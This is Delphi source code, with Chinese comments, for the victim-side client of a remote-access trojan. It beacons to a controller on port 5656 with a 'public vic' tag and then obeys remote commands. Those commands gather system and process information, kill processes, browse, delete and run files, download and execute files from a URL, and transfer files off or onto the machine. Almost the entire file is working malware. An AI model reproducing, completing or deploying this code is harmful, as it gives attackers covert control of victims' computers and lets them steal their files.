program Client;

uses
  Windows, TlHelp32, WinSock, SocketUnit, FuncUnit, Urlmon, ShellAPI;

const
  RemoteHost = 'LocalHost';             //远程计算机DNS
  RemotePort = 5656;                    //远程Server端口
  ClietAssigned = 'public vic';         //Client标识

var
  MasterSocket : TClientSocket;

//发送函数
function SendData(StrData: String): Boolean;
var
  Results: Integer;
begin
  Results := MasterSocket.SendString(StrData);
  case Results of
    SOCKET_ERROR: Result := False;
    //: ;
  else
    Result := True;
  end;
end;

//接收数据函数
function RecvData(): String;
var
  Results: Integer;
  StrTmp: Array[0..2047] of char;
begin
  Result := '';
  Results := MasterSocket.ReceiveBuffer(StrTmp, 2048);

  case Results of
    SOCKET_ERROR: Result := '';
    //: ;
  else
    Result := Copy(StrTmp, 0, Results);
  end;
end;

////////////////////////////////////////////////////////////////////////////////
//获取系统信息函数...计算机用户名,CPU类型,主频,
//已用物理内存,可用物理内存,物理内存,屏幕分辨率,Client标识
function GetSysInfo:String;
var
  msMemory: TMemoryStatus;
begin
  GlobalMemoryStatus(msMemory);
  Result := GetPcName + #$B9 +
            IntToStr(ReadRegInt(HKEY_LOCAL_MACHINE, 'HARDWARE\DESCRIPTION\System\CentralProcessor\0', '~MHz')) + 'MHz' + #$B9 +
            ReadRegStr(HKEY_LOCAL_MACHINE, 'HARDWARE\DESCRIPTION\System\CentralProcessor\0', 'ProcessorNameString') + #$B9 +
            IntToStr(msMemory.dwMemoryLoad) + '%' + #$B9 +
            IntToStr(msMemory.dwAvailPhys div 1024 div 1024) + 'MB' + #$B9 +
            IntToStr(msMemory.dwTotalPhys div 1024 div 1024) + 'MB' + #$B9 +
            IntToStr(GetSystemMetrics(SM_CXSCREEN)) + 'x' + IntToStr(GetSystemMetrics(SM_CYSCREEN)) + #$B9 +
            ClietAssigned;
end;

//获取进程列表
function GetProcessInfo:String;
var
  Process32: TProcessEntry32;
  ProcessSnapshot: THandle;
  Module32: TModuleEntry32;
  ModuleSnapshot: THandle;
  StrTemp: String;
begin
  GetDebugPrivs;
  Result := '';
  ProcessSnapshot := CreateToolHelp32SnapShot(TH32CS_SNAPALL, 0);
  Process32.dwSize := SizeOf(TProcessEntry32);
  Process32First(ProcessSnapshot, Process32);
  Process32Next(ProcessSnapshot, Process32);
  repeat
    ModuleSnapshot := CreateToolHelp32SnapShot(TH32CS_SNAPMODULE, Process32.th32ProcessID);
    Module32.dwSize := SizeOf(TModuleEntry32);
    Module32First(ModuleSnapshot, Module32);
    StrTemp := String(Module32.szExePath);
    CloseHandle(ModuleSnapshot);
    Result := Result + String(Process32.szExeFile) + #$B9 + IntToStr(Process32.th32ProcessID) + #$B9 + StrTemp + #$0D#$0A;
  until not (Process32Next(ProcessSnapshot, Process32));
  CloseHandle(ProcessSnapshot);
end;

//获取磁盘信息
function GetDriveInfo:String;
var
  szBuffer: Array[0..MAX_PATH] of char;
  I, DriveCount: Integer;
  IndexDisk: Pchar;
  dwFree, dwAlls: Extended;
  dw1, dw2, dw3: Int64;
begin
  Result := '';
  DriveCount := GetLogicalDriveStrings(MAX_PATH, szBuffer) div 4;
  for I := 0 to DriveCount - 1 do
  begin
    IndexDisk := Pchar(@szBuffer[I * 4]);
    GetDiskFreeSpaceExA(IndexDisk, dw1, dw2, @dw3);
    dwFree := ((dw1 div 1024) div 1024) / 1024;
    dwAlls := ((dw2 div 1024) div 1024) / 1024;
    Result := Result + String(IndexDisk) + #$B9 + FloatToStr(dwFree) + #$B9 + FloatToStr(dwAlls)+ #$B9 + IntToStr(GetDriveType(IndexDisk)) + #$0D#$0A;
  end;
end;

//获取磁盘文件信息
function ListFiles(Directory:String):string;
var
  FileName: string;
  FindHandle: THandle;
  SearchRec: TWIN32FindData;
  FileType: Integer;
begin
  Result := '';
  FindHandle := FindFirstFile(PChar(Directory + '*.*'), SearchRec);
  if FindHandle <> INVALID_HANDLE_VALUE then
  repeat
    FileName := SearchRec.cFileName;
    if ((SearchRec.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) <> 0) then
    begin
      FileType := 0;
      Result := Result + IntToStr(FileType) + #$B9 + FileName + #$B9 + #$0D#$0A;
    end else
    begin
      //文件类型 + 文件名 + 文件体积
      FileType := 1;
      Result := Result + IntToStr(FileType) + #$B9 + FileName + #$B9 + IntToFmFloat(SearchRec.nFileSizeLow) + #$0D#$0A;
    end;
  until (FindNextFile(FindHandle,SearchRec) = False);

  FindClose(FindHandle);
end;

//文件下载传输过程
function DownFile(FileName: string):Boolean;
const
  BufferSize = 2048;
var
  BinaryFile: THandle;
  BinaryBuffer: Pchar;
  StrTmp: String;
  BinaryFileSize, BytesRead: dword;
begin
  Result := False;

  BinaryFile := CreateFile(Pchar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  if (BinaryFile = INVALID_HANDLE_VALUE) then Exit;

  //传输文件第一步...传输文件体积
  BinaryFileSize := GetFileSize(BinaryFile, nil);
  if Not SendData('dw' + #$07 + IntToStr(BinaryFileSize)) then Exit;

  //等待Server发送传输开始指令
  StrTmp := RecvData();
  //接收到的数据长度为0或者不是开始传输指令
  if (Length(StrTmp) = 0) or (StrTmp[1] <> #$A3) then Exit;

  //申请缓冲区准备开始传输文件
  GetMem(BinaryBuffer, BufferSize);
  try
    repeat
      //Sleep(10);                  //适当的延迟还是需要的
      ReadFile(BinaryFile, BinaryBuffer^, BufferSize, BytesRead, nil);
      //Sleep(10);                  //太需要了
      if (MasterSocket.SendBuffer(BinaryBuffer^, BytesRead) = SOCKET_ERROR) then Exit;
    until BytesRead < 2048;
    Result := True;
  finally
    FreeMem(BinaryBuffer);        //释放内存
    CloseHandle(BinaryFile);        //关闭进程句柄
  end;
end;

//文件上传传输过程
function UploadFile(FileName: String):Boolean;
const
  BufferSize = 2048;
var
  BinaryBuffer: Pchar;
  StrTmp: String;
  BinaryFile: THandle;
  BytesReceived: Integer;
  BytesWritten: dword;
begin
  Result := False;

  //分离文件名
  StrTmp := Copy(FileName, 1, Pos(#$B9, FileName) - 1);

  //创建文件
  BinaryFile := CreateFile(Pchar(StrTmp), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  if (BinaryFile = INVALID_HANDLE_VALUE) then Exit;

  //发送开始上传指令
  if Not SendData('up') then Exit;
  Sleep(10);
  //申请空间开始接收数据包
  GetMem(BinaryBuffer, BufferSize);
  try
    repeat
      //接收数据
      BytesReceived := MasterSocket.ReceiveBuffer(BinaryBuffer^, BufferSize);
      //接收数据为-1出错
      if (BytesReceived = SOCKET_ERROR) then Exit;
      if not WriteFile(BinaryFile, BinaryBuffer^, BytesReceived, BytesWritten, nil)then Exit;
      //Sleep(10);
    until BytesReceived < 2048;
    Result := True;
  finally
    FreeMem(BinaryBuffer);
    CloseHandle(BinaryFile);
  end;
end;
//

//命令循环监听过程
procedure LoopRecv();
label Start;
var
  szBuffer: Array[0..MAX_PATH] of char;
  StrTempPath, StrTempPathFile: String;
  StrCmds, CmdIn: String;                     //接收数据缓冲区
  StrBuffer, SendBuffer: String;              //接收命令
begin
  //获取临时文件目录
  GetTempPath(MAX_PATH, szBuffer);
  StrTempPath := String(szBuffer);

  while True do
  begin

Start:
    if Not MasterSocket.Connected then Break;
    StrCmds := RecvData;
    if Not MasterSocket.Connected then Break;
    
    if StrCmds[3] <> #$07 then Break;

    //命令处理部分
    CmdIn := Split(StrCmds, #07, 1);

    if CmdIn = '*' then Break;          //关闭服务段

    if CmdIn = 're' then                //卸载服务端
    begin
      Break;
    end else
    if CmdIn = 'if' then                //获取计算机基本信息
    begin
      SendBuffer := 'if' + #$07 + GetSysInfo;
    end else
    if CmdIn = 'dl' then                //下载执行文件
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      StrTempPathFile := StrTempPath + ExtractURLName(StrBuffer);
      if URLDownloadToFile(nil, Pchar(StrBuffer), Pchar(StrTempPathFile), 0, nil)= S_OK then
      begin
        ShellExecute(0, 'open', Pchar(StrTempPathFile), nil, nil, SW_SHOW);
        SendBuffer := 'as' + #$07 + 'File downloaded and executed';
      end;
    end else
    //进程管理部分
    if CmdIn = 'pr' then        //刷新进程
    begin
      SendBuffer := 'pr' + #$07 + GetProcessInfo;
    end else
    if CmdIn = 'tm' then        //结束进程
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      KillProcessByPID(String(StrBuffer));
      SendBuffer := 'as' + #$07 + 'Process Terminated';
    end else

    {重点中的重点...文件管理部分}
    if CmdIn = 'dr' then            //刷新磁盘目录
    begin
      SendBuffer := 'dr' + #$07 + GetDriveInfo;
    end else
    if CmdIn = 'fl' then            //刷新磁盘文件
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      SendBuffer := ListFiles(StrBuffer);

      if Not SendData('fl' + #$07) then Break;    //发送列表开始信息
      Sleep(40);
      if Not SendData(SendBuffer) then Break;     //发送列表信息
      Sleep(20);
      if Not SendData('fe' + #$07) then Break;    //发送列表信息传输完毕信息
      Goto Start;
    end else
    if CmdIn = 'de' then            //删除磁盘文件
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      if DeleteFile(Pchar(StrBuffer)) then
        SendBuffer := 'as'+ #$07 + 'File deleted'
      else
        SendBuffer := 'io'+ #$07;     //删除出错返回io(输出错误的意思)
    end else
    if CmdIn = 'ex' then            //执行磁盘文件
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      ShellExecute(0, 'Open', Pchar(StrBuffer), nil, nil, SW_SHOW);
      SendBuffer := 'as'+ #$07 + 'File executed';
    end else
    if CmdIn = 'mf' then            //新建文件夹
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      if CreateDirectory(Pchar(StrBuffer), nil) then
        SendBuffer := 'as'+ #$07 + 'Folder created'
      else
        SendBuffer := 'io'+ #$07;
    end else
    //关键中的关键.....传输文件部分......嘿嘿～捣鼓捣鼓再捣鼓
    if CmdIn = 'dw' then            //下载目标计算机上面的文件到当前目录
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      if DownFile(StrBuffer) then
        Goto Start else SendBuffer := 'io'+ #$07;
    end else
    if CmdIn = 'up' then            //下载目标计算机上面的文件到当前目录
    begin
      StrBuffer := Copy(StrCmds, 4, Length(StrCmds));
      if UpLoadFile(StrBuffer) then
        Goto Start else SendBuffer := 'io'+ #$07;
    end;

    //发送失败跳出循环
    if Not SendData(SendBuffer) then Break;
  end;
end;

//主函数部分
procedure WinMain();
var
  StrCmds: String;
begin
  MasterSocket := TClientSocket.Create;
  MasterSocket.Connect(RemoteHost, RemotePort);

  //连接成功..发送上线标识
  if MasterSocket.Connected then
  begin
    StrCmds := '*' + GetPcName + #07 + ClietAssigned;
    if SendData(StrCmds) then
    begin
      if MasterSocket.Connected then
      begin
        LoopRecv();
      end;
    end;
  end;

  //断开连接
  MasterSocket.Disconnect;
  MasterSocket.Free;
end;

begin
  WinMain();
end.
